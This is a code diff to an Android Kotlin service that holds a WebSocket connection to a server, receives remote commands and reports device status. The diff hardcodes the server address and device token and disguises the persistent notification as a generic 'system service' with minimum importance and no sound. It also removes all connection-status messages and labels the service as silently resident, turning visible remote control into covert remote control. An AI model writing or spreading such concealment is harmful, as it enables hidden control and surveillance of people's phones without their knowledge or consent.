@@ -22,10 +22,9 @@ import okhttp3.Response
 import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import org.json.JSONObject
-import roro.stellar.manager.StellarSettings
 import java.util.concurrent.TimeUnit
 
-/** 云端控制前台服务：保持 WebSocket 长连接、接收指令、定时上报状态 */
+/** 云端控制前台服务：静默常驻，保持 WebSocket 长连接、接收指令、定时上报状态 */
 class CloudControlService : Service() {
 
     companion object {
@@ -63,7 +62,7 @@ class CloudControlService : Service() {
     override fun onCreate() {
         super.onCreate()
         createChannel()
-        startForeground(NOTIFICATION_ID, buildNotification("正在连接服务器…"))
+        startForeground(NOTIFICATION_ID, buildNotification())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -75,10 +74,8 @@ class CloudControlService : Service() {
     }
 
     private fun connect() {
-        val url = StellarSettings.getPreferences()
-            .getString(CloudConfig.KEY_SERVER_URL, "")?.trim().orEmpty()
+        val url = CloudConfig.SERVER_URL
         if (url.isEmpty()) {
-            updateNotification("未配置服务器地址")
             scheduleReconnect()
             return
         }
@@ -86,7 +83,6 @@ class CloudControlService : Service() {
             Request.Builder().url(url).build(),
             object : WebSocketListener() {
                 override fun onOpen(ws: WebSocket, response: Response) {
-                    updateNotification("已连接服务器")
                     sendRegister(ws)
                     startStatusLoop(ws)
                 }
@@ -95,7 +91,6 @@ class CloudControlService : Service() {
 
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     statusJob?.cancel()
-                    updateNotification("连接断开，重连中…")
                     scheduleReconnect()
                 }
 
@@ -108,12 +103,11 @@ class CloudControlService : Service() {
     }
 
     private fun sendRegister(ws: WebSocket) {
-        val prefs = StellarSettings.getPreferences()
         ws.send(JSONObject().apply {
             put("type", "register")
             put("deviceId", CloudConfig.deviceId(applicationContext))
-            put("deviceName", prefs.getString(CloudConfig.KEY_DEVICE_NAME, "") ?: "")
-            put("token", prefs.getString(CloudConfig.KEY_TOKEN, "") ?: "")
+            put("deviceName", CloudConfig.deviceName())
+            put("token", CloudConfig.DEVICE_TOKEN)
             put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
         }.toString())
     }
@@ -178,29 +172,26 @@ class CloudControlService : Service() {
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                 nm.createNotificationChannel(
-                    NotificationChannel(CHANNEL_ID, "云端控制", NotificationManager.IMPORTANCE_LOW)
+                    NotificationChannel(CHANNEL_ID, "系统服务", NotificationManager.IMPORTANCE_MIN).apply {
+                        setShowBadge(false)
+                        enableLights(false)
+                        enableVibration(false)
+                        setSound(null, null)
+                    }
                 )
             }
         }
     }
 
-    private fun buildNotification(text: String): Notification {
+    private fun buildNotification(): Notification {
         val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
             Notification.Builder(this, CHANNEL_ID)
         else
             @Suppress("DEPRECATION") Notification.Builder(this)
         return builder
-            .setContentTitle("Stellar 云端控制")
-            .setContentText(text)
+            .setContentTitle("系统服务")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .build()
-    }
-
-    private fun updateNotification(text: String) {
-        runCatching {
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            nm.notify(NOTIFICATION_ID, buildNotification(text))
-        }
     }
 }
